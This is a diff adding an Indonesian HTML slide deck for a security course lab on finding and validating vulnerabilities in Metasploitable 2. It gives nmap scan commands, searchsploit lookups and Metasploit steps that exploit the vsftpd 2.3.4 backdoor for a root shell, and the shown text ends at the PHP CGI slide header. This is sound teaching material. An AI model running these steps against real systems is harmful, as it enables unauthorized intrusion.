@@ -1,0 +1,1565 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Praktik Week 4 – Identifikasi Kerentanan Potensial | RKS222 PSSN</title>
+<style>
+  :root {
+    --pssn-blue: #0d2b6b;
+    --pssn-darkblue: #081a45;
+    --pssn-gold: #e8a020;
+    --pssn-lightgold: #ffd166;
+    --pssn-red: #c0392b;
+    --bg-light: #f0f4f8;
+    --text-dark: #1a1a2e;
+    --text-light: #ffffff;
+    --card-bg: #ffffff;
+    --accent-green: #27ae60;
+    --accent-orange: #e67e22;
+    --accent-purple: #8e44ad;
+    --accent-red: #e74c3c;
+    --accent-teal: #16a085;
+    --shadow: 0 4px 20px rgba(0,0,0,0.12);
+    --radius: 12px;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: var(--bg-light);
+    color: var(--text-dark);
+    overflow: hidden;
+    height: 100vh; width: 100vw;
+  }
+  #slideshow { width: 100%; height: 100vh; position: relative; }
+  .slide {
+    position: absolute; top: 0; left: 0;
+    width: 100%; height: 100%;
+    display: flex; flex-direction: column;
+    opacity: 0; pointer-events: none;
+    transition: opacity 0.45s ease;
+    overflow-y: auto;
+  }
+  .slide.active { opacity: 1; pointer-events: all; }
+
+  /* NAV */
+  #navbar {
+    position: fixed; bottom: 0; left: 0; right: 0; z-index: 999;
+    background: var(--pssn-darkblue);
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 10px 24px; gap: 12px;
+    box-shadow: 0 -2px 12px rgba(0,0,0,0.3);
+  }
+  .nav-btn {
+    background: var(--pssn-gold); color: var(--pssn-darkblue);
+    border: none; border-radius: 8px; padding: 8px 22px;
+    font-weight: 700; font-size: 14px; cursor: pointer;
+    transition: background 0.2s, transform 0.1s;
+  }
+  .nav-btn:hover { background: var(--pssn-lightgold); transform: translateY(-1px); }
+  .nav-btn:disabled { background: #555; color: #aaa; cursor: not-allowed; transform: none; }
+  #slide-counter { color: #aaa; font-size: 13px; min-width: 90px; text-align: center; }
+  #progress-bar { flex: 1; height: 6px; background: #333; border-radius: 3px; overflow: hidden; }
+  #progress-fill { height: 100%; background: var(--pssn-gold); border-radius: 3px; transition: width 0.4s ease; }
+  #slide-title-bar { color: #ccc; font-size: 12px; flex: 1.5; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+  /* SLIDE HEADER */
+  .slide-header {
+    background: var(--pssn-blue); padding: 22px 48px 18px; color: white;
+    flex-shrink: 0;
+  }
+  .slide-header h2 { font-size: 20px; font-weight: 800; margin-bottom: 4px; }
+  .slide-header p { font-size: 13px; color: rgba(255,255,255,0.7); }
+  .slide-body { padding: 24px 48px 90px; flex: 1; }
+
+  .section-label {
+    display: inline-block;
+    background: var(--pssn-gold); color: var(--pssn-darkblue);
+    font-weight: 800; font-size: 11px; letter-spacing: 1.5px;
+    padding: 4px 12px; border-radius: 20px; text-transform: uppercase;
+    margin-bottom: 12px;
+  }
+
+  /* COVER */
+  #s0 {
+    background: linear-gradient(135deg, #0d2b6b 0%, #1a3a8f 40%, #7b0d1e 100%);
+    justify-content: center; align-items: center; text-align: center;
+    position: relative; padding: 40px;
+  }
+  #s0::before {
+    content: ''; position: absolute; inset: 0;
+    background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+  }
+  .cover-badge {
+    background: rgba(232,160,32,0.2); border: 1px solid var(--pssn-gold);
+    color: var(--pssn-gold); border-radius: 20px; padding: 6px 18px;
+    font-size: 13px; font-weight: 600; letter-spacing: 1px;
+    margin-bottom: 24px; display: inline-block;
+  }
+  .cover-title { color: white; font-size: 34px; font-weight: 800; line-height: 1.2; margin-bottom: 10px; text-shadow: 0 2px 8px rgba(0,0,0,0.3); }
+  .cover-subtitle { color: var(--pssn-lightgold); font-size: 20px; font-weight: 600; margin-bottom: 6px; }
+  .cover-meta { color: rgba(255,255,255,0.7); font-size: 14px; margin-bottom: 36px; }
+  .cover-divider { width: 80px; height: 3px; background: var(--pssn-gold); border-radius: 2px; margin: 24px auto; }
+  .cover-pills { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; margin-top: 8px; }
+  .cover-pill { background: rgba(255,255,255,0.12); color: white; border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; padding: 8px 16px; font-size: 13px; }
+  .cover-pill strong { color: var(--pssn-gold); }
+  .cover-inst { color: rgba(255,255,255,0.6); font-size: 13px; margin-top: 32px; }
+
+  /* CARDS & GRIDS */
+  .card {
+    background: white; border-radius: var(--radius);
+    box-shadow: var(--shadow); padding: 18px 22px; margin-bottom: 14px;
+  }
+  .card-grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+  .card-grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 14px; }
+  .card-grid-5 { display: grid; grid-template-columns: repeat(5, 1fr); gap: 12px; }
+
+  .obj-card {
+    background: white; border-radius: var(--radius); padding: 16px 18px;
+    box-shadow: var(--shadow); border-top: 4px solid;
+    display: flex; gap: 12px; align-items: flex-start;
+  }
+  .obj-num {
+    width: 32px; height: 32px; border-radius: 8px; display: flex;
+    align-items: center; justify-content: center; font-weight: 800; font-size: 15px;
+    flex-shrink: 0; color: white;
+  }
+  .obj-text { font-size: 13px; color: #333; line-height: 1.55; }
+  .obj-bloom { font-size: 11px; color: #999; margin-top: 4px; font-style: italic; }
+
+  /* CODE BLOCKS */
+  .code-block {
+    background: #1e1e2e; border-radius: 10px; padding: 16px 20px;
+    margin: 10px 0; font-family: 'Courier New', monospace; font-size: 13px;
+    color: #cdd6f4; overflow-x: auto; position: relative;
+  }
+  .code-block .prompt { color: #a6e3a1; }
+  .code-block .cmd { color: #89b4fa; }
+  .code-block .flag { color: #f38ba8; }
+  .code-block .ip { color: #fab387; }
+  .code-block .comment { color: #6c7086; font-style: italic; }
+  .code-label {
+    background: #313244; color: #cba6f7; font-size: 11px; font-weight: 700;
+    padding: 3px 10px; border-radius: 6px 6px 0 0; display: inline-block;
+    margin-bottom: -2px; letter-spacing: 0.5px;
+  }
+
+  /* STEP FLOW */
+  .step-list { list-style: none; }
+  .step-item {
+    display: flex; gap: 14px; align-items: flex-start;
+    margin-bottom: 14px;
+  }
+  .step-num {
+    width: 30px; height: 30px; border-radius: 50%; background: var(--pssn-blue);
+    color: white; font-weight: 800; font-size: 13px;
+    display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+  }
+  .step-content { flex: 1; }
+  .step-content strong { font-size: 14px; color: var(--pssn-blue); display: block; margin-bottom: 4px; }
+  .step-content p { font-size: 13px; color: #555; line-height: 1.5; }
+
+  /* VULN INFO BOX */
+  .vuln-box {
+    border-radius: var(--radius); padding: 16px 20px; margin-bottom: 14px;
+  }
+  .vuln-box.ftp  { background: #fff3f3; border-left: 5px solid #e74c3c; }
+  .vuln-box.http { background: #fff8ec; border-left: 5px solid #e67e22; }
+  .vuln-box.smb  { background: #f0f8ff; border-left: 5px solid #2980b9; }
+  .vuln-box.sql  { background: #f3fff5; border-left: 5px solid #27ae60; }
+  .vuln-box h3 { font-size: 14px; font-weight: 700; margin-bottom: 8px; }
+  .vuln-table { width: 100%; border-collapse: collapse; font-size: 12.5px; }
+  .vuln-table td { padding: 5px 10px; border-bottom: 1px solid rgba(0,0,0,0.06); }
+  .vuln-table td:first-child { color: #888; font-weight: 600; width: 160px; }
+  .vuln-table td:last-child { color: #222; font-weight: 500; }
+
+  /* ALERT / INFO BOXES */
+  .info-box {
+    border-radius: 8px; padding: 12px 16px; margin: 10px 0;
+    font-size: 13px; line-height: 1.55; display: flex; gap: 10px; align-items: flex-start;
+  }
+  .info-box.blue  { background: #e8f4fd; border-left: 4px solid #2980b9; color: #1a4a6b; }
+  .info-box.green { background: #eafaf1; border-left: 4px solid #27ae60; color: #145a32; }
+  .info-box.orange{ background: #fef9e7; border-left: 4px solid #f39c12; color: #7d6608; }
+  .info-box.red   { background: #fdedec; border-left: 4px solid #e74c3c; color: #7b241c; }
+  .info-icon { font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+
+  /* PORT OVERVIEW */
+  .port-card {
+    background: white; border-radius: var(--radius); padding: 14px 16px;
+    box-shadow: var(--shadow); border-top: 4px solid; text-align: center;
+  }
+  .port-num { font-size: 22px; font-weight: 800; margin-bottom: 4px; }
+  .port-proto { font-size: 12px; text-transform: uppercase; letter-spacing: 1px; color: #888; margin-bottom: 6px; }
+  .port-service { font-size: 13px; font-weight: 600; color: #333; }
+  .port-vuln { font-size: 11px; color: #888; margin-top: 4px; }
+
+  /* FLOW ARROWS */
+  .flow-row {
+    display: flex; align-items: center; gap: 8px;
+    margin-bottom: 10px; flex-wrap: wrap;
+  }
+  .flow-box {
+    background: var(--pssn-blue); color: white; border-radius: 8px;
+    padding: 10px 16px; font-size: 12px; font-weight: 600; text-align: center;
+  }
+  .flow-box.alt { background: var(--accent-green); }
+  .flow-box.warn { background: var(--accent-orange); }
+  .flow-arrow { color: #aaa; font-size: 18px; flex-shrink: 0; }
+
+  /* SUMMARY TABLE */
+  .summary-table { width: 100%; border-collapse: collapse; font-size: 12.5px; }
+  .summary-table th {
+    background: var(--pssn-blue); color: white; padding: 10px 14px;
+    text-align: left; font-size: 11px; letter-spacing: 0.5px;
+  }
+  .summary-table td { padding: 9px 14px; border-bottom: 1px solid #e8e8e8; color: #333; }
+  .summary-table tr:nth-child(even) td { background: #f8f9fa; }
+  .tag {
+    display: inline-block; border-radius: 4px; padding: 2px 8px;
+    font-size: 11px; font-weight: 700; letter-spacing: 0.3px;
+  }
+  .tag-red    { background: #fdedec; color: #c0392b; }
+  .tag-orange { background: #fef9e7; color: #d35400; }
+  .tag-blue   { background: #e8f4fd; color: #1a4a6b; }
+  .tag-green  { background: #eafaf1; color: #145a32; }
+  .tag-purple { background: #f5eef8; color: #7d3c98; }
+
+  /* TOOL CARDS */
+  .tool-card {
+    background: #1e1e2e; border-radius: var(--radius); padding: 16px 18px;
+    color: #cdd6f4;
+  }
+  .tool-card h4 { color: #89b4fa; font-size: 14px; margin-bottom: 8px; }
+  .tool-card p { font-size: 12.5px; line-height: 1.55; color: #a6adc8; }
+
+  h3.section-h { font-size: 16px; font-weight: 700; color: var(--pssn-blue); margin-bottom: 12px; margin-top: 18px; }
+  h3.section-h:first-child { margin-top: 0; }
+
+  /* Keyboard shortcut hint */
+  .key-hint {
+    position: fixed; top: 14px; right: 18px; z-index: 9999;
+    background: rgba(8,26,69,0.85); color: #aaa; font-size: 11px;
+    border-radius: 8px; padding: 6px 12px; border: 1px solid #333;
+  }
+</style>
+</head>
+<body>
+
+<div class="key-hint">← → untuk navigasi &nbsp;|&nbsp; ESC keluar fullscreen</div>
+
+<div id="slideshow">
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 0 – COVER -->
+<div class="slide active" id="s0" data-title="Cover">
+  <div style="position:relative;z-index:1;max-width:800px;margin:auto;">
+    <div class="cover-badge">RKS222 · Keamanan Web &amp; Peranti Bergerak</div>
+    <div class="cover-title">Identifikasi Kerentanan Potensial</div>
+    <div class="cover-subtitle">Modul Bahan Praktik – Week 4</div>
+    <div class="cover-meta">Target: Metasploitable 2 &nbsp;|&nbsp; Tools: Nmap · Metasploit · Dirb · Searchsploit</div>
+    <div class="cover-divider"></div>
+    <div class="cover-pills">
+      <div class="cover-pill"><strong>Port 21</strong> FTP / VSFTPD</div>
+      <div class="cover-pill"><strong>Port 80</strong> PHP CGI</div>
+      <div class="cover-pill"><strong>Port 80</strong> TWiki</div>
+      <div class="cover-pill"><strong>Port 139/445</strong> SMB/Samba</div>
+      <div class="cover-pill"><strong>Port 5432</strong> PostgreSQL</div>
+    </div>
+    <div class="cover-inst">Gunakan tombol ← → di bawah atau tombol panah keyboard untuk navigasi</div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 1 – CAPAIAN -->
+<div class="slide" id="s1" data-title="Capaian Pembelajaran">
+  <div class="slide-header">
+    <div class="section-label">Capaian Pembelajaran</div>
+    <h2>Apa yang Akan Dicapai</h2>
+    <p>Setelah praktik ini, mahasiswa mampu melakukan identifikasi dan validasi kerentanan secara sistematis</p>
+  </div>
+  <div class="slide-body">
+    <div class="card-grid-2">
+      <div class="obj-card" style="border-top-color:#e74c3c;">
+        <div class="obj-num" style="background:#e74c3c;">1</div>
+        <div class="obj-text">
+          Melakukan <strong>Network &amp; Port Scanning</strong> pada mesin target menggunakan Nmap untuk mengidentifikasi layanan yang aktif.
+          <div class="obj-bloom">C3 – Penerapan</div>
+        </div>
+      </div>
+      <div class="obj-card" style="border-top-color:#e67e22;">
+        <div class="obj-num" style="background:#e67e22;">2</div>
+        <div class="obj-text">
+          Melakukan <strong>Directory Enumeration</strong> pada layanan web menggunakan tools Dirb/Dirbuster.
+          <div class="obj-bloom">C3 – Penerapan</div>
+        </div>
+      </div>
+      <div class="obj-card" style="border-top-color:#2980b9;">
+        <div class="obj-num" style="background:#2980b9;">3</div>
+        <div class="obj-text">
+          Mengidentifikasi kerentanan pada layanan yang berjalan menggunakan <strong>Exploit-DB</strong> dan <strong>Searchsploit</strong>.
+          <div class="obj-bloom">C4 – Analisis</div>
+        </div>
+      </div>
+      <div class="obj-card" style="border-top-color:#8e44ad;">
+        <div class="obj-num" style="background:#8e44ad;">4</div>
+        <div class="obj-text">
+          Melakukan <strong>validasi kerentanan</strong> menggunakan framework Metasploit pada 5 layanan: FTP, PHP CGI, TWiki, SMB, dan PostgreSQL.
+          <div class="obj-bloom">C5 – Evaluasi</div>
+        </div>
+      </div>
+      <div class="obj-card" style="border-top-color:#27ae60;">
+        <div class="obj-num" style="background:#27ae60;">5</div>
+        <div class="obj-text">
+          Mendokumentasikan temuan kerentanan dalam bentuk <strong>laporan terstruktur</strong> mencakup service, versi, CVE/referensi, dan bukti validasi.
+          <div class="obj-bloom">C6 – Mencipta</div>
+        </div>
+      </div>
+      <div class="obj-card" style="border-top-color:#16a085;">
+        <div class="obj-num" style="background:#16a085;">6</div>
+        <div class="obj-text">
+          Memahami konsep <strong>Vulnerability Assessment</strong> sebagai bagian dari siklus penetration testing yang etis dan bertanggung jawab.
+          <div class="obj-bloom">C2 – Pemahaman</div>
+        </div>
+      </div>
+    </div>
+    <div class="info-box orange" style="margin-top:16px;">
+      <span class="info-icon">⚠️</span>
+      <div><strong>Peringatan Etika:</strong> Seluruh praktik hanya dilakukan pada lingkungan lab terkontrol (Metasploitable 2). Tidak diperbolehkan melakukan scanning atau eksploitasi pada sistem nyata tanpa izin tertulis.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 2 – TOPOLOGI & SETUP -->
+<div class="slide" id="s2" data-title="Topologi & Setup Lab">
+  <div class="slide-header">
+    <div class="section-label">Setup Lab</div>
+    <h2>Topologi &amp; Konfigurasi Lingkungan Praktik</h2>
+    <p>Pastikan semua komponen sudah siap sebelum memulai praktik</p>
+  </div>
+  <div class="slide-body">
+    <div class="card-grid-2" style="margin-bottom:16px;">
+      <div class="tool-card">
+        <h4>🖥️ Kali Linux (Attacker)</h4>
+        <p>Mesin penyerang. Pastikan sudah terinstall: <strong>nmap</strong>, <strong>metasploit-framework</strong>, <strong>dirb</strong>, <strong>smbclient</strong>, <strong>searchsploit</strong>.</p>
+        <div style="margin-top:10px;font-size:12px;color:#89b4fa;">IP: 192.168.39.x (sesuaikan)</div>
+      </div>
+      <div class="tool-card">
+        <h4>🎯 Metasploitable 2 (Target)</h4>
+        <p>Mesin target yang sengaja dibuat rentan untuk keperluan latihan keamanan. Jangan expose ke jaringan publik.</p>
+        <div style="margin-top:10px;font-size:12px;color:#fab387;">IP: 192.168.39.135 (contoh pada modul)</div>
+      </div>
+    </div>
+
+    <h3 class="section-h">Langkah Verifikasi Konektivitas</h3>
+    <div class="step-list">
+      <div class="step-item">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <strong>Cek IP Kali Linux</strong>
+          <p>Jalankan perintah berikut untuk mengetahui IP address Kali Linux Anda:</p>
+          <div class="code-label">Terminal – Kali Linux</div>
+          <div class="code-block"><span class="prompt">$</span> <span class="cmd">ip a</span> &nbsp;<span class="comment"># atau ifconfig</span></div>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <strong>Temukan IP Metasploitable 2</strong>
+          <p>Lakukan host discovery pada subnet yang sama:</p>
+          <div class="code-label">Terminal – Kali Linux</div>
+          <div class="code-block"><span class="prompt">$</span> <span class="cmd">nmap</span> <span class="flag">-sn</span> <span class="ip">192.168.39.0/24</span> &nbsp;<span class="comment"># ganti subnet sesuai jaringan Anda</span></div>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <strong>Verifikasi koneksi ke target</strong>
+          <p>Pastikan Kali Linux dapat menjangkau Metasploitable 2:</p>
+          <div class="code-label">Terminal – Kali Linux</div>
+          <div class="code-block"><span class="prompt">$</span> <span class="cmd">ping</span> <span class="ip">192.168.39.135</span> <span class="flag">-c 4</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box blue">
+      <span class="info-icon">ℹ️</span>
+      <div>IP address <code>192.168.39.135</code> pada modul ini adalah contoh. Ganti dengan IP Metasploitable 2 yang aktual di jaringan lab Anda.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 3 – PORT SCANNING -->
+<div class="slide" id="s3" data-title="(1) Identifikasi Aset – Port Scanning">
+  <div class="slide-header">
+    <div class="section-label">Tahap 1 – Identifikasi Aset</div>
+    <h2>Port &amp; Services Scanning</h2>
+    <p>Mengidentifikasi port terbuka, layanan, dan sistem operasi pada Metasploitable 2</p>
+  </div>
+  <div class="slide-body">
+    <h3 class="section-h">Perintah Utama</h3>
+    <div class="code-label">Terminal – Kali Linux</div>
+    <div class="code-block">
+<span class="prompt">#</span> <span class="cmd">nmap</span> <span class="flag">-sV -Pn -O</span> <span class="ip">192.168.39.135</span>
+<br><br>
+<span class="comment"># Keterangan flag:</span>
+<span class="comment"># -sV  : Service/Version Detection – deteksi versi program yang berjalan</span>
+<span class="comment"># -Pn  : Nonaktifkan host discovery (anggap host aktif)</span>
+<span class="comment"># -O   : OS Detection – deteksi sistem operasi</span>
+    </div>
+
+    <h3 class="section-h">Hasil yang Diharapkan</h3>
+    <div class="card" style="border-top: 3px solid var(--pssn-blue);">
+      <table style="width:100%;border-collapse:collapse;font-size:12.5px;">
+        <thead>
+          <tr style="background:#f0f4f8;">
+            <th style="padding:8px 12px;text-align:left;color:#555;">Port</th>
+            <th style="padding:8px 12px;text-align:left;color:#555;">State</th>
+            <th style="padding:8px 12px;text-align:left;color:#555;">Service</th>
+            <th style="padding:8px 12px;text-align:left;color:#555;">Version</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td style="padding:7px 12px;border-bottom:1px solid #eee;"><strong>21</strong></td><td style="padding:7px 12px;border-bottom:1px solid #eee;">open</td><td style="padding:7px 12px;border-bottom:1px solid #eee;">ftp</td><td style="padding:7px 12px;border-bottom:1px solid #eee;">vsftpd 2.3.4</td></tr>
+          <tr><td style="padding:7px 12px;border-bottom:1px solid #eee;background:#f8f9fa;"><strong>22</strong></td><td style="padding:7px 12px;border-bottom:1px solid #eee;background:#f8f9fa;">open</td><td style="padding:7px 12px;border-bottom:1px solid #eee;background:#f8f9fa;">ssh</td><td style="padding:7px 12px;border-bottom:1px solid #eee;background:#f8f9fa;">OpenSSH 4.7p1</td></tr>
+          <tr><td style="padding:7px 12px;border-bottom:1px solid #eee;"><strong>80</strong></td><td style="padding:7px 12px;border-bottom:1px solid #eee;">open</td><td style="padding:7px 12px;border-bottom:1px solid #eee;">http</td><td style="padding:7px 12px;border-bottom:1px solid #eee;">Apache httpd 2.2.8 + PHP 5.2.4</td></tr>
+          <tr><td style="padding:7px 12px;border-bottom:1px solid #eee;background:#f8f9fa;"><strong>139</strong></td><td style="padding:7px 12px;border-bottom:1px solid #eee;background:#f8f9fa;">open</td><td style="padding:7px 12px;border-bottom:1px solid #eee;background:#f8f9fa;">netbios-ssn</td><td style="padding:7px 12px;border-bottom:1px solid #eee;background:#f8f9fa;">Samba smbd 3.X–4.X</td></tr>
+          <tr><td style="padding:7px 12px;border-bottom:1px solid #eee;"><strong>445</strong></td><td style="padding:7px 12px;border-bottom:1px solid #eee;">open</td><td style="padding:7px 12px;border-bottom:1px solid #eee;">microsoft-ds</td><td style="padding:7px 12px;border-bottom:1px solid #eee;">Samba 3.0.20-Debian</td></tr>
+          <tr><td style="padding:7px 12px;background:#f8f9fa;"><strong>5432</strong></td><td style="padding:7px 12px;background:#f8f9fa;">open</td><td style="padding:7px 12px;background:#f8f9fa;">postgresql</td><td style="padding:7px 12px;background:#f8f9fa;">PostgreSQL DB 8.3.0–8.3.7</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="info-box green">
+      <span class="info-icon">✅</span>
+      <div><strong>Catat informasi ini:</strong> Versi software yang terdeteksi adalah kunci utama untuk mencari kerentanan yang sesuai di tahap selanjutnya.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 4 – OVERVIEW KERENTANAN -->
+<div class="slide" id="s4" data-title="Overview Kerentanan yang Ditemukan">
+  <div class="slide-header">
+    <div class="section-label">Peta Kerentanan</div>
+    <h2>5 Kerentanan Utama pada Metasploitable 2</h2>
+    <p>Setiap layanan yang terbuka berpotensi menjadi vektor serangan</p>
+  </div>
+  <div class="slide-body">
+    <div class="card-grid-5" style="margin-bottom:18px;">
+      <div class="port-card" style="border-top-color:#e74c3c;">
+        <div class="port-num" style="color:#e74c3c;">21</div>
+        <div class="port-proto">TCP / FTP</div>
+        <div class="port-service">VSFTPD 2.3.4</div>
+        <div class="port-vuln">Backdoor<br>Command Exec</div>
+      </div>
+      <div class="port-card" style="border-top-color:#e67e22;">
+        <div class="port-num" style="color:#e67e22;">80</div>
+        <div class="port-proto">TCP / HTTP</div>
+        <div class="port-service">PHP 5.2.4 CGI</div>
+        <div class="port-vuln">Arg Injection<br>Remote Code Exec</div>
+      </div>
+      <div class="port-card" style="border-top-color:#f39c12;">
+        <div class="port-num" style="color:#f39c12;">80</div>
+        <div class="port-proto">TCP / HTTP</div>
+        <div class="port-service">TWiki ~2003</div>
+        <div class="port-vuln">'rev' Parameter<br>Command Exec</div>
+      </div>
+      <div class="port-card" style="border-top-color:#2980b9;">
+        <div class="port-num" style="color:#2980b9;">139/445</div>
+        <div class="port-proto">TCP / SMB</div>
+        <div class="port-service">Samba 3.0.20</div>
+        <div class="port-vuln">Usermap Script<br>Command Exec</div>
+      </div>
+      <div class="port-card" style="border-top-color:#27ae60;">
+        <div class="port-num" style="color:#27ae60;">5432</div>
+        <div class="port-proto">TCP / SQL</div>
+        <div class="port-service">PostgreSQL 8.3.1</div>
+        <div class="port-vuln">Weak Credential +<br>UDF Code Exec</div>
+      </div>
+    </div>
+
+    <h3 class="section-h">Metodologi Identifikasi Kerentanan</h3>
+    <div class="flow-row">
+      <div class="flow-box">Port &amp; Service<br>Scanning (Nmap)</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-box">Enum Versi<br>Software</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-box">Cari CVE di<br>Exploit-DB / Searchsploit</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-box alt">Validasi dengan<br>Metasploit</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-box warn">Dokumentasi<br>Temuan</div>
+    </div>
+
+    <div class="info-box blue" style="margin-top:14px;">
+      <span class="info-icon">🔍</span>
+      <div>Pada praktik ini kita menggunakan dua sumber referensi kerentanan: <strong>Exploit-DB</strong> (database eksploit publik) dan <strong>Searchsploit</strong> (pencarian offline Exploit-DB). Metasploit digunakan untuk validasi bahwa kerentanan benar-benar dapat dieksploitasi.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 5 – FTP VSFTPD -->
+<div class="slide" id="s5" data-title="Kerentanan FTP – VSFTPD 2.3.4">
+  <div class="slide-header">
+    <div class="section-label">Kerentanan 1 – Port 21</div>
+    <h2>FTP – VSFTPD 2.3.4 Backdoor</h2>
+    <p>Versi VSFTPD 2.3.4 mengandung backdoor yang sengaja ditanam – memungkinkan Remote Command Execution</p>
+  </div>
+  <div class="slide-body">
+    <div class="vuln-box ftp" style="margin-bottom:16px;">
+      <h3>📋 Profil Kerentanan</h3>
+      <table class="vuln-table">
+        <tr><td>Service / Protocol</td><td>FTP (File Transfer Protocol)</td></tr>
+        <tr><td>Nama Program</td><td>VSFTPD (Very Secure FTP Daemon)</td></tr>
+        <tr><td>Versi</td><td>2.3.4</td></tr>
+        <tr><td>Jenis Kerentanan</td><td>Backdoor Command Execution</td></tr>
+        <tr><td>Referensi Exploit-DB</td><td>https://www.exploit-db.com/exploits/17491</td></tr>
+        <tr><td>Modul Metasploit</td><td><code>exploit/unix/ftp/vsftpd_234_backdoor</code></td></tr>
+      </table>
+    </div>
+
+    <h3 class="section-h">Penjelasan Kerentanan</h3>
+    <div class="card">
+      <p style="font-size:13px;line-height:1.65;color:#444;">
+        Versi VSFTPD 2.3.4 yang didistribusikan antara Juni–Juli 2011 mengandung backdoor yang ditanam oleh pihak tidak bertanggung jawab pada server distribusi resmi. Backdoor ini dipicu ketika <strong>username FTP mengandung karakter ":)"</strong>. Ketika dipicu, server membuka port 6200 dan memberikan akses shell dengan hak akses <em>root</em>.
+      </p>
+    </div>
+
+    <h3 class="section-h">Identifikasi dengan Searchsploit</h3>
+    <div class="code-label">Terminal – Kali Linux</div>
+    <div class="code-block">
+<span class="prompt">$</span> <span class="cmd">searchsploit</span> vsftpd 2.3.4
+<br>
+<span class="comment">----------------------------------------------------------------------</span>
+<span class="comment"> Exploit Title                              |  Path</span>
+<span class="comment">----------------------------------------------------------------------</span>
+<span class="comment"> vsftpd 2.3.4 - Backdoor Command Execution  | unix/remote/17491.rb</span>
+<span class="comment">----------------------------------------------------------------------</span>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 6 – FTP VALIDASI -->
+<div class="slide" id="s6" data-title="Validasi Kerentanan FTP – Metasploit">
+  <div class="slide-header">
+    <div class="section-label">Validasi 1 – Port 21 / FTP</div>
+    <h2>Validasi VSFTPD 2.3.4 Backdoor via Metasploit</h2>
+    <p>Ikuti langkah-langkah berikut secara berurutan di terminal Kali Linux</p>
+  </div>
+  <div class="slide-body">
+    <div class="step-list">
+      <div class="step-item">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <strong>Jalankan Metasploit Framework</strong>
+          <div class="code-label">Terminal</div>
+          <div class="code-block"><span class="prompt">$</span> <span class="cmd">sudo msfconsole</span></div>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <strong>Cari modul exploit untuk VSFTPD</strong>
+          <div class="code-label">msf6 &gt;</div>
+          <div class="code-block"><span class="cmd">search</span> vsftpd</div>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <strong>Pilih dan aktifkan modul exploit</strong>
+          <div class="code-label">msf6 &gt;</div>
+          <div class="code-block"><span class="cmd">use</span> exploit/unix/ftp/vsftpd_234_backdoor</div>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <strong>Cek opsi yang diperlukan</strong>
+          <div class="code-label">msf6 exploit(vsftpd_234_backdoor) &gt;</div>
+          <div class="code-block"><span class="cmd">show options</span></div>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <strong>Konfigurasi target (RHOSTS) dan jalankan exploit</strong>
+          <div class="code-label">msf6 exploit(vsftpd_234_backdoor) &gt;</div>
+          <div class="code-block">
+<span class="cmd">set</span> rhosts <span class="ip">192.168.39.135</span>
+<br><span class="cmd">exploit</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box green">
+      <span class="info-icon">✅</span>
+      <div><strong>Hasil yang diharapkan:</strong> Jika berhasil, Metasploit akan membuka sesi shell (<code>command shell session</code>) yang memberikan akses root pada mesin Metasploitable 2. Tangkap screenshot sebagai bukti validasi.</div>
+    </div>
+
+    <div class="card" style="border-left:4px solid #e74c3c;margin-top:10px;">
+      <p style="font-size:12.5px;color:#555;"><strong>📝 Tugas Dokumentasi:</strong> Catat nama exploit yang digunakan, parameter yang dikonfigurasi, dan hasil akhir (berhasil/gagal beserta alasannya) dalam laporan praktik Anda.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 7 – PHP CGI IDENTIFIKASI -->
+<div class="slide" id="s7" data-title="Kerentanan HTTP – PHP 5.2.4 CGI">
+  <div class="slide-header">
+    <div class="section-label">Kerentanan 2 – Port 80</div>
+    <h2>HTTP – PHP 5.2.4 CGI Argument Injection</h2>
